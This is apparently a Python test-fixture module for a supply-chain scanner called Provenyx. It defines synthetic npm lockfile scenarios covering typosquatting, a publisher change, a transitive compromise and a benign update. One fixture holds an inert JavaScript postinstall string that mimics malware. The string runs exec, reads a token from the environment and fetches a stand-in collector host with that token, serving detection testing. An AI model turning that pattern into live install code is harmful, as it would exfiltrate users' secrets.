"""Safe synthetic fixtures for the Phase 3 demonstration.

The JavaScript strings in this module are inert text stored in in-memory archives. Provenyx
only performs its existing bounded lexical inspection; none of the source is imported or run.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
from dataclasses import dataclass, field
from typing import Any

from app.parsers.npm_registry import RegistryMetadata


@dataclass(frozen=True)
class ScenarioDefinition:
    identifier: str
    title: str
    description: str
    project_name: str
    baseline: dict[str, Any]
    modified: dict[str, Any]
    metadata: dict[tuple[str, str], RegistryMetadata]
    archives: dict[str, bytes] = field(default_factory=dict)
    expected_rules: tuple[str, ...] = ()
    limitations: tuple[str, ...] = ()


def _entry(
    name: str,
    version: str,
    *,
    dependencies: dict[str, str] | None = None,
    install_script: bool = False,
    resolved: str | None = None,
    integrity: str | None = None,
) -> dict[str, Any]:
    value: dict[str, Any] = {"name": name, "version": version}
    if dependencies:
        value["dependencies"] = dependencies
    if install_script:
        value["hasInstallScript"] = True
    if resolved:
        value["resolved"] = resolved
    if integrity:
        value["integrity"] = integrity
    return value


def _lockfile(project: str, root_dependencies: dict[str, str], packages: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {
        "name": project,
        "version": "1.0.0",
        "lockfileVersion": 3,
        "requires": True,
        "packages": {
            "": {"name": project, "version": "1.0.0", "dependencies": root_dependencies},
            **packages,
        },
    }


def _metadata(
    package: str,
    version: str,
    *,
    publisher: str = "provenyx-labs",
    maintainers: tuple[str, ...] = ("provenyx-labs",),
    install_scripts: tuple[str, ...] = (),
    has_provenance: bool = True,
    tarball_url: str | None = None,
    integrity: str | None = None,
) -> RegistryMetadata:
    return RegistryMetadata(
        package=package,
        version=version,
        status="available",
        publisher=publisher,
        description="Synthetic Phase 3 fixture; not a real package release.",
        license="MIT",
        dist_integrity=integrity,
        tarball_url=tarball_url,
        install_scripts=install_scripts,
        has_provenance=has_provenance,
        maintainers=maintainers,
    )


def _archive(source: str, *, install_script: bool) -> tuple[bytes, str]:
    package_json = {
        "name": "provenyx-synthetic-release",
        "version": "2.0.0",
        "scripts": {"postinstall": "node install.js"} if install_script else {},
    }
    files = {
        "package/package.json": json.dumps(package_json, sort_keys=True).encode(),
        "package/install.js": source.encode(),
    }
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as bundle:
        for path, content in sorted(files.items()):
            info = tarfile.TarInfo(path)
            info.size = len(content)
            info.mtime = 0
            bundle.addfile(info, io.BytesIO(content))
    data = buffer.getvalue()
    digest = base64.b64encode(hashlib.sha512(data).digest()).decode()
    return data, f"sha512-{digest}"


def _typosquatting() -> ScenarioDefinition:
    baseline = _lockfile(
        "phase3-typosquat-demo",
        {"express": "4.18.2"},
        {"node_modules/express": _entry("express", "4.18.2")},
    )
    modified = _lockfile(
        "phase3-typosquat-demo",
        {"express": "4.18.2", "expres": "1.0.0"},
        {
            "node_modules/express": _entry("express", "4.18.2"),
            "node_modules/expres": _entry("expres", "1.0.0"),
        },
    )
    return ScenarioDefinition(
        identifier="typosquatting-attack",
        title="Typosquatting attack",
        description="Adds the near-match package expres beside the trusted package express.",
        project_name="phase3-typosquat-demo",
        baseline=baseline,
        modified=modified,
        metadata={
            ("express", "4.18.2"): _metadata("express", "4.18.2", publisher="expressjs"),
            ("expres", "1.0.0"): _metadata("expres", "1.0.0", publisher="synthetic-author"),
        },
        expected_rules=("new-dependency", "possible-typosquatting"),
        limitations=("Package-name similarity is an investigation signal and does not establish malicious intent.",),
    )


def _suspicious_update() -> ScenarioDefinition:
    # The indicator-like text is inside a template literal: even if somebody ran this fixture
    # contrary to the demo instructions, it would only export a string and perform no action.
    source = """// Synthetic text fixture; never executed.\nconst demonstrationOnly = String.raw`\nrequire('child_process').exec('printf phase3-demo');\nconst token = process.env.DEMO_TOKEN;\nconst encoded = Buffer.from('ZGVtby1vbmx5', 'base64');\nfetch('https://collector.invalid.test/demo?value=' + token + encoded);\n`;\nmodule.exports = demonstrationOnly;\n"""
    archive, integrity = _archive(source, install_script=True)
    url = "https://registry.npmjs.org/provenyx-synthetic-widget/-/provenyx-synthetic-widget-2.0.0.tgz"
    baseline = _lockfile(
        "phase3-update-demo",
        {"provenyx-synthetic-widget": "1.0.0"},
        {"node_modules/provenyx-synthetic-widget": _entry("provenyx-synthetic-widget", "1.0.0")},
    )
    modified = _lockfile(
        "phase3-update-demo",
        {"provenyx-synthetic-widget": "2.0.0"},
        {
            "node_modules/provenyx-synthetic-widget": _entry(
                "provenyx-synthetic-widget",
                "2.0.0",
                install_script=True,
                resolved=url,
                integrity=integrity,
            )
        },
    )
    return ScenarioDefinition(
        identifier="suspicious-package-update",
        title="Suspicious package update",
        description="Updates a synthetic release to one with correlated install-time static indicators.",
        project_name="phase3-update-demo",
        baseline=baseline,
        modified=modified,
        metadata={
            ("provenyx-synthetic-widget", "1.0.0"): _metadata("provenyx-synthetic-widget", "1.0.0"),
            ("provenyx-synthetic-widget", "2.0.0"): _metadata(
                "provenyx-synthetic-widget",
                "2.0.0",
                install_scripts=("postinstall",),
                tarball_url=url,
                integrity=integrity,
            ),
        },
        archives={url: archive},
        expected_rules=("install-script-added", "suspicious-install-time-behavior"),
        limitations=(
            "Static matches are bounded lexical indicators; they do not prove data flow, execution, or compromise.",
        ),
    )


def _publisher_change() -> ScenarioDefinition:
    baseline = _lockfile(
        "phase3-publisher-demo",
        {"provenyx-synthetic-tool": "1.0.0"},
        {"node_modules/provenyx-synthetic-tool": _entry("provenyx-synthetic-tool", "1.0.0")},
    )
    modified = _lockfile(
        "phase3-publisher-demo",
        {"provenyx-synthetic-tool": "2.0.0"},
        {
            "node_modules/provenyx-synthetic-tool": _entry(
                "provenyx-synthetic-tool", "2.0.0", install_script=True
            )
        },
    )
    return ScenarioDefinition(
        identifier="publisher-change",
        title="Publisher change",
        description="Changes the release publisher and removes provenance while adding an install script.",
        project_name="phase3-publisher-demo",
        baseline=baseline,
        modified=modified,
        metadata={
            ("provenyx-synthetic-tool", "1.0.0"): _metadata(
                "provenyx-synthetic-tool", "1.0.0", publisher="original-owner", maintainers=("original-owner",)
            ),
            ("provenyx-synthetic-tool", "2.0.0"): _metadata(
                "provenyx-synthetic-tool",
                "2.0.0",
                publisher="new-owner",
                maintainers=("original-owner", "new-owner"),
                install_scripts=("postinstall",),
                has_provenance=False,
            ),
        },
        expected_rules=("publisher-change", "install-script-added", "provenance-removed"),
        limitations=(
            "Persisted release snapshots show an identity change but cannot establish whether it was authorized.",
        ),
    )


def _transitive_compromise() -> ScenarioDefinition:
    baseline_packages = {
        "node_modules/package-a": _entry("package-a", "1.0.0", dependencies={"package-b": "1.0.0"}),
        "node_modules/package-b": _entry("package-b", "1.0.0"),
    }
    modified_packages = {
        "node_modules/package-a": _entry("package-a", "1.0.0", dependencies={"package-b": "1.0.0"}),
        "node_modules/package-b": _entry("package-b", "1.0.0", dependencies={"lodahs": "1.0.0"}),
        "node_modules/lodahs": _entry("lodahs", "1.0.0"),
    }
    return ScenarioDefinition(
        identifier="transitive-dependency-compromise",
        title="Transitive dependency compromise",
        description="Adds a suspicious near-match through app -> package-a -> package-b -> lodahs.",
        project_name="phase3-transitive-demo",
        baseline=_lockfile("phase3-transitive-demo", {"package-a": "1.0.0"}, baseline_packages),
        modified=_lockfile("phase3-transitive-demo", {"package-a": "1.0.0"}, modified_packages),
        metadata={
            (name, "1.0.0"): _metadata(name, "1.0.0", publisher=f"{name}-owner")
            for name in ("package-a", "package-b", "lodahs")
        },
        expected_rules=("new-dependency", "dependency-expansion", "possible-typosquatting"),
        limitations=(
            "Dependency reachability identifies an installation path; it does not prove runtime import or execution.",
        ),
    )


def _legitimate_update() -> ScenarioDefinition:
    baseline = _lockfile(
        "phase3-legitimate-demo",
        {"provenyx-benign-library": "1.0.0"},
        {"node_modules/provenyx-benign-library": _entry("provenyx-benign-library", "1.0.0")},
    )
    modified = _lockfile(
        "phase3-legitimate-demo",
        {"provenyx-benign-library": "1.1.0"},
        {"node_modules/provenyx-benign-library": _entry("provenyx-benign-library", "1.1.0")},
    )
    return ScenarioDefinition(
        identifier="legitimate-update",
        title="Legitimate update",
        description="Updates a synthetic library with stable publisher, maintainer, provenance, and behavior metadata.",
        project_name="phase3-legitimate-demo",
        baseline=baseline,
        modified=modified,
        metadata={
            ("provenyx-benign-library", version): _metadata("provenyx-benign-library", version, publisher="stable-owner")
            for version in ("1.0.0", "1.1.0")
        },
        expected_rules=(),
        limitations=("No finding means no configured deterministic rule matched; it is not a guarantee of safety.",),
    )


SCENARIOS: dict[str, ScenarioDefinition] = {
    scenario.identifier: scenario
    for scenario in (
        _typosquatting(),
        _suspicious_update(),
        _publisher_change(),
        _transitive_compromise(),
        _legitimate_update(),
    )
}
